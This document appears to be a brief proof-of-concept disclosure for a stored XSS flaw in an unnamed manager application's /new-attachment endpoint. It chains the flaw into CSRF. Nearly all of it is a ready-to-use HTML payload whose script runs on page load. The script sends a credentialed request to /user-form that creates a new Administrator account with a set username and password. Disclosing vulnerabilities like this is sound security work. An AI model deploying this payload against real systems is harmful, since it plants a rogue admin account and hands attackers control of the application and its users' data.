# POC_10072026_Manager_4
XSS_to_CSRF_create_New_Admin_account



<img width="800" height="405" alt="XSS_to_CSRF_create_New_Admin_account-ezgif com-video-to-gif-converter" src="https://github.com/user-attachments/assets/e23a0194-4f0e-4c35-af00-88dc33e71293" />



End-Point:
  /new-attachment?


Payload:

```
<!DOCTYPE html>
<html>
<body>

<p id="result">Creating admin...</p>

<script>
async function createAdmin() {
  const response = await fetch("/user-form", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "HX-Request": "true",
      "HX-Boosted": "true",
      "HX-Trigger": "CreateNewAdmin"
    },
    body: "Name=Create_New_Admin&EmailAddress=test%40gmail.com&Username=NewAdmin&Password=12345&Type=Administrator"
  });

  const data = await response.text();
  document.getElementById("result").innerHTML = data;
}

// Execute once when the page loads
window.addEventListener("DOMContentLoaded", createAdmin);
</script>

</body>
</html>
```
